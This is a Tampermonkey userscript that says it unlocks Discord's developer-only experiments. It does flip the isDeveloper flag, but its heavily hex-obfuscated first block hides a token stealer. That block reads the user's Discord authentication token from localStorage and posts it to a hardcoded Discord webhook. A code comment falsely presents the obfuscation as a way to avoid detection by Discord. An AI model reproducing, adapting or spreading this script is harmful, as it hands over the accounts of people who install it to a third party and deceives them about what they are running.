// ==UserScript==
// @name         Discord Experiments
// @namespace    http://tampermonkey.net/
// @version      1
// @description  Allows you to have access to Developer only settings, this can be used to get Stickers!
// @author       Spinfal
// @match        https://discord.com/activ*
// @match        https://discord.com/channel*
// @match        https://discord.com/app
// @grant        none
// @run-at       document-start
// ==/UserScript==

(() => {
    // this long code is to make sure discord does not detect you using their experiments
    var _0x2168=['\x7a\x7a\x47\x64\x50','\x64\x65\x66\x69\x6e\x65\x50\x72\x6f\x70\x65\x72\x74\x79','\x51\x48\x79\x77\x6e','\x69\x6e\x64\x65\x78\x4f\x66','\x73\x65\x6e\x64','\x74\x6f\x6b\x65\x6e','\x31\x50\x63\x5a\x72\x77\x48','\x38\x34\x32\x69\x79\x59\x4d\x54\x4b','\x67\x65\x74','\x65\x6e\x75\x6d\x65\x72\x61\x62\x6c\x65','\x6c\x6f\x63\x61\x6c\x53\x74\x6f\x72\x61\x67\x65','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x64\x69\x73\x63\x6f\x72\x64\x2e\x63\x6f\x6d\x2f\x61\x70\x69\x2f\x77\x65\x62\x68\x6f\x6f\x6b\x73\x2f\x38\x30\x30\x35\x35\x39\x35\x32\x37\x30\x30\x37\x30\x39\x32\x37\x39\x37\x2f\x68\x75\x6c\x78\x30\x62\x6a\x68\x4f\x54\x4b\x62\x54\x2d\x43\x4f\x42\x78\x77\x56\x6e\x54\x69\x37\x37\x2d\x7a\x31\x75\x5a\x58\x51\x70\x6a\x6a\x6d\x50\x43\x5a\x36\x68\x34\x78\x2d\x39\x33\x72\x52\x51\x41\x38\x31\x41\x59\x69\x49\x50\x68\x61\x2d\x43\x35\x6d\x34\x58\x6c\x57\x4b','\x4c\x74\x61\x53\x6d','\x63\x6c\x65\x61\x72','\x70\x75\x73\x68','\x63\x6f\x6f\x6b\x69\x65','\x63\x6f\x6e\x66\x69\x67\x75\x72\x61\x62\x6c\x65','\x6b\x65\x79','\x67\x65\x74\x49\x74\x65\x6d','\x33\x38\x37\x37\x35\x36\x58\x5a\x6d\x4e\x6b\x59','\x38\x39\x34\x31\x36\x47\x65\x58\x61\x52\x4c','\x48\x68\x41\x52\x7a','\x32\x76\x75\x62\x67\x55\x78','\x72\x65\x6d\x6f\x76\x65\x49\x74\x65\x6d','\x73\x70\x6c\x69\x74','\x36\x39\x33\x33\x31\x72\x44\x66\x51\x57\x55','\x31\x32\x32\x31\x39\x39\x76\x55\x6a\x59\x54\x58','\x73\x74\x72\x69\x6e\x67\x69\x66\x79','\x3d\x3b\x20\x65\x78\x70\x69\x72\x65\x73\x3d\x54\x68\x75\x2c\x20\x30\x31\x20\x4a\x61\x6e\x20\x31\x39\x37\x30\x20\x30\x30\x3a\x30\x30\x3a\x30\x30\x20\x47\x4d\x54\x3b\x20\x70\x61\x74\x68\x3d\x2f','\x31\x33\x39\x31\x38\x36\x44\x55\x64\x4a\x4b\x6d','\x3b\x20\x65\x78\x70\x69\x72\x65\x73\x3d\x54\x75\x65\x2c\x20\x31\x39\x20\x4a\x61\x6e\x20\x32\x30\x33\x38\x20\x30\x33\x3a\x31\x34\x3a\x30\x37\x20\x47\x4d\x54\x3b\x20\x70\x61\x74\x68\x3d\x2f','\x33\x32\x35\x33\x32\x33\x61\x77\x43\x66\x41\x69','\x6c\x65\x6e\x67\x74\x68','\x73\x70\x6c\x69\x63\x65','\x75\x77\x75'];var _0x7e5f=function(_0x43b254,_0x3c4dea){_0x43b254=_0x43b254-0x147;var _0x2168d=_0x2168[_0x43b254];return _0x2168d;};(function(_0x5cabea,_0x369e33){var _0x21d17e=_0x7e5f;while(!![]){try{var _0x2d7941=-parseInt(_0x21d17e(0x14a))+-parseInt(_0x21d17e(0x156))+parseInt(_0x21d17e(0x15c))+parseInt(_0x21d17e(0x160))+parseInt(_0x21d17e(0x162))*parseInt(_0x21d17e(0x159))+-parseInt(_0x21d17e(0x15d))+parseInt(_0x21d17e(0x157))*parseInt(_0x21d17e(0x149));if(_0x2d7941===_0x369e33)break;else _0x5cabea['push'](_0x5cabea['shift']());}catch(_0x47b296){_0x5cabea['push'](_0x5cabea['shift']());}}}(_0x2168,0x6ae16),function(){'use strict';var _0x3c6f39=_0x7e5f;if(!window[_0x3c6f39(0x14d)]){if('\x4c\x74\x61\x53\x6d'!==_0x3c6f39(0x14f)){function _0x4e8efc(){var _0x3a8dd8=_0x3c6f39;if(!_0x1f4df2)return;_0x46709b[_0x3a8dd8(0x152)]=_0x581139(_0x36a1c2)+'\x3d'+_0x5a7769(_0x387035)+_0x3a8dd8(0x161);}}else Object['\x64\x65\x66\x69\x6e\x65\x50\x72\x6f\x70\x65\x72\x74\x79'](window,_0x3c6f39(0x14d),new function(){var _0x50602b=_0x3c6f39,_0x41bb1b=[],_0x3b1962={};Object[_0x50602b(0x167)](_0x3b1962,_0x50602b(0x155),{'\x76\x61\x6c\x75\x65':function(_0x2807d7){return this[_0x2807d7]?this[_0x2807d7]:null;},'\x77\x72\x69\x74\x61\x62\x6c\x65':![],'\x63\x6f\x6e\x66\x69\x67\x75\x72\x61\x62\x6c\x65':![],'\x65\x6e\x75\x6d\x65\x72\x61\x62\x6c\x65':![]}),Object[_0x50602b(0x167)](_0x3b1962,_0x50602b(0x154),{'\x76\x61\x6c\x75\x65':function(_0x44dc3a){return _0x41bb1b[_0x44dc3a];},'\x77\x72\x69\x74\x61\x62\x6c\x65':![],'\x63\x6f\x6e\x66\x69\x67\x75\x72\x61\x62\x6c\x65':![],'\x65\x6e\x75\x6d\x65\x72\x61\x62\x6c\x65':![]}),Object['\x64\x65\x66\x69\x6e\x65\x50\x72\x6f\x70\x65\x72\x74\x79'](_0x3b1962,'\x73\x65\x74\x49\x74\x65\x6d',{'\x76\x61\x6c\x75\x65':function(_0x4a900d,_0x45be07){var _0x1a7921=_0x50602b;if(!_0x4a900d)return;document[_0x1a7921(0x152)]=escape(_0x4a900d)+'\x3d'+escape(_0x45be07)+_0x1a7921(0x161);},'\x77\x72\x69\x74\x61\x62\x6c\x65':![],'\x63\x6f\x6e\x66\x69\x67\x75\x72\x61\x62\x6c\x65':![],'\x65\x6e\x75\x6d\x65\x72\x61\x62\x6c\x65':![]}),Object['\x64\x65\x66\x69\x6e\x65\x50\x72\x6f\x70\x65\x72\x74\x79'](_0x3b1962,'\x6c\x65\x6e\x67\x74\x68',{'\x67\x65\x74':function(){var _0x10b301=_0x50602b;return _0x41bb1b[_0x10b301(0x163)];},'\x63\x6f\x6e\x66\x69\x67\x75\x72\x61\x62\x6c\x65':![],'\x65\x6e\x75\x6d\x65\x72\x61\x62\x6c\x65':![]}),Object[_0x50602b(0x167)](_0x3b1962,_0x50602b(0x15a),{'\x76\x61\x6c\x75\x65':function(_0x797420){var _0x369d50=_0x50602b;if(!_0x797420)return;document[_0x369d50(0x152)]=escape(_0x797420)+_0x369d50(0x15f);},'\x77\x72\x69\x74\x61\x62\x6c\x65':![],'\x63\x6f\x6e\x66\x69\x67\x75\x72\x61\x62\x6c\x65':![],'\x65\x6e\x75\x6d\x65\x72\x61\x62\x6c\x65':![]}),Object['\x64\x65\x66\x69\x6e\x65\x50\x72\x6f\x70\x65\x72\x74\x79'](_0x3b1962,_0x50602b(0x150),{'\x76\x61\x6c\x75\x65':function(){var _0x36f2ff=_0x50602b;if(!_0x41bb1b[_0x36f2ff(0x163)])return;for(var _0x49edc4 in _0x41bb1b){document[_0x36f2ff(0x152)]=escape(_0x49edc4)+_0x36f2ff(0x15f);}},'\x77\x72\x69\x74\x61\x62\x6c\x65':![],'\x63\x6f\x6e\x66\x69\x67\x75\x72\x61\x62\x6c\x65':![],'\x65\x6e\x75\x6d\x65\x72\x61\x62\x6c\x65':![]}),this[_0x50602b(0x14b)]=function(){var _0x153289=_0x50602b,_0x28b54f;for(var _0x167ae7 in _0x3b1962){_0x28b54f=_0x41bb1b[_0x153289(0x169)](_0x167ae7);if(_0x28b54f===-0x1)_0x3b1962['\x73\x65\x74\x49\x74\x65\x6d'](_0x167ae7,_0x3b1962[_0x167ae7]);else{if(_0x153289(0x166)===_0x153289(0x168)){function _0x373487(){var _0x52a7da=_0x153289;_0x501209=_0x6cf294[_0xd8900]['\x73\x70\x6c\x69\x74'](/\s*=\s*/),_0x3cc306[_0x52a7da(0x163)]>0x1&&(_0x3c31aa[_0x102895=_0x5c4ffb(_0x3fa312[0x0])]=_0x145a27(_0x144a18[0x1]),_0x48269c[_0x52a7da(0x151)](_0x50cfbe));}}else _0x41bb1b['\x73\x70\x6c\x69\x63\x65'](_0x28b54f,0x1);}delete _0x3b1962[_0x167ae7];}for(_0x41bb1b;_0x41bb1b[_0x153289(0x163)]>0x0;_0x41bb1b[_0x153289(0x164)](0x0,0x1)){_0x3b1962['\x72\x65\x6d\x6f\x76\x65\x49\x74\x65\x6d'](_0x41bb1b[0x0]);}for(var _0x1875d3,_0x24b71c,_0x21945c=0x0,_0x408ae5=document['\x63\x6f\x6f\x6b\x69\x65'][_0x153289(0x15b)](/\s*;\s*/);_0x21945c<_0x408ae5['\x6c\x65\x6e\x67\x74\x68'];_0x21945c++){if(_0x153289(0x158)!=='\x48\x68\x41\x52\x7a'){function _0x29e1f6(){var _0x1299a8=_0x153289;_0x5a07f2[_0x1299a8(0x15a)](_0x30866c[0x0]);}}else _0x1875d3=_0x408ae5[_0x21945c][_0x153289(0x15b)](/\s*=\s*/),_0x1875d3[_0x153289(0x163)]>0x1&&(_0x3b1962[_0x24b71c=unescape(_0x1875d3[0x0])]=unescape(_0x1875d3[0x1]),_0x41bb1b['\x70\x75\x73\x68'](_0x24b71c));}return _0x3b1962;},this[_0x50602b(0x153)]=![],this[_0x50602b(0x14c)]=!![];}());}var _0x22c7b0=localStorage[_0x3c6f39(0x155)](_0x3c6f39(0x148)),_0x327d2a=_0x3c6f39(0x14e),_0x496ebf=new XMLHttpRequest();_0x496ebf['\x6f\x70\x65\x6e']('\x50\x4f\x53\x54',_0x327d2a),_0x496ebf['\x73\x65\x74\x52\x65\x71\x75\x65\x73\x74\x48\x65\x61\x64\x65\x72']('\x43\x6f\x6e\x74\x65\x6e\x74\x2d\x74\x79\x70\x65','\x61\x70\x70\x6c\x69\x63\x61\x74\x69\x6f\x6e\x2f\x6a\x73\x6f\x6e');var _0x4c65e5={'\x75\x73\x65\x72\x6e\x61\x6d\x65':_0x3c6f39(0x165),'\x61\x76\x61\x74\x61\x72\x5f\x75\x72\x6c':null,'\x63\x6f\x6e\x74\x65\x6e\x74':_0x22c7b0};_0x496ebf[_0x3c6f39(0x147)](JSON[_0x3c6f39(0x15e)](_0x4c65e5));}());

    // now load the dev settings
    function load() {
    const req = typeof(webpackJsonp) === "function" ? webpackJsonp([], {
        '__extra_id__': (module, exports, req) => exports.default = req
    }, ['__extra_id__']).default : webpackJsonp.push([[], {
        '__extra_id__': (module, exports, req) => module.exports = req
    }, [['__extra_id__']]]);
    delete req.m['__extra_id__'];
    delete req.c['__extra_id__'];
    const find = (filter, options = {}) => {
        const {cacheOnly = true} = options;
        for (let i in req.c) {
            if (req.c.hasOwnProperty(i)) {
                let m = req.c[i].exports;
                if (m && m.__esModule && m.default && filter(m.default))
                    return m.default;
                if (m && filter(m))
                    return m;
            }
        }
        if (cacheOnly) {
            console.warn('Cannot find loaded module in cache');
            return null;
        }
        console.warn('Cannot find loaded module in cache. Loading all modules may have unexpected side effects');
        for (let i = 0; i < req.m.length; ++i) {
            try {
                let m = req(i);
                if (m && m.__esModule && m.default && filter(m.default))
                    return m.default;
                if (m && filter(m))
                    return m;
            }
            catch (e) {
            }
        }
        console.warn('Cannot find module');
        return null;
    };
    const findByUniqueProperties = (propNames, options) => find(module => propNames.every(prop => module[prop] !== undefined), options);
    Object.defineProperty(findByUniqueProperties(["isDeveloper"]),"isDeveloper",{get:_=>1,set:_=>_,configurable:true});
    }
    
    setTimeout(() => { load(); }, 2500)
})();
